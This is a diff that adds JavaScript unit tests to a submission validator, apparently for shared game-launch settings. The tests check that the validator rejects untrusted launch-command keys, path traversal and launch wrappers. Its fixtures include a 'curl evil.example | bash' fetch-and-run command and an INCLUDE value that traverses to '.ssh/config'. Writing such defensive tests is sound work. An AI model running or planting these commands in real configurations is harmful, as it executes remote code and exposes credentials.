@@ -84,6 +84,52 @@ describe("validatePublishSubmission", () => {
     );
   });
 
+  it("rejects untrusted exec keys in env_content", () => {
+    assert.throws(
+      () =>
+        validatePublishSubmission(
+          validSubmission({
+            envContent: "GAMEMODE=1\nPRE_LAUNCH_CMD=curl evil.example | bash\n",
+          }),
+        ),
+      /VALIDATION_ERROR: env_content must not set PRE_LAUNCH_CMD/,
+    );
+  });
+
+  it("rejects path-traversal INCLUDE in env_content", () => {
+    assert.throws(
+      () =>
+        validatePublishSubmission(
+          validSubmission({
+            envContent: "INCLUDE=../../../.ssh/config\nGAMEMODE=1\n",
+          }),
+        ),
+      /VALIDATION_ERROR: env_content line .*INCLUDE path is not allowed/,
+    );
+  });
+
+  it("allows empty untrusted keys in env_content", () => {
+    assert.doesNotThrow(() =>
+      validatePublishSubmission(
+        validSubmission({
+          envContent: "PRE_LAUNCH_CMD=\nPOST_LAUNCH_CMD=\"\"\nGAMEMODE=1\n",
+        }),
+      ),
+    );
+  });
+
+  it("rejects untrusted keys in settings array", () => {
+    assert.throws(
+      () =>
+        validatePublishSubmission(
+          validSubmission({
+            settings: [{ key: "LAUNCH_WRAPPERS", value: "gamescope" }],
+          }),
+        ),
+      /VALIDATION_ERROR: settings must not include LAUNCH_WRAPPERS/,
+    );
+  });
+
   it("rejects invalid setting keys", () => {
     assert.throws(
       () =>
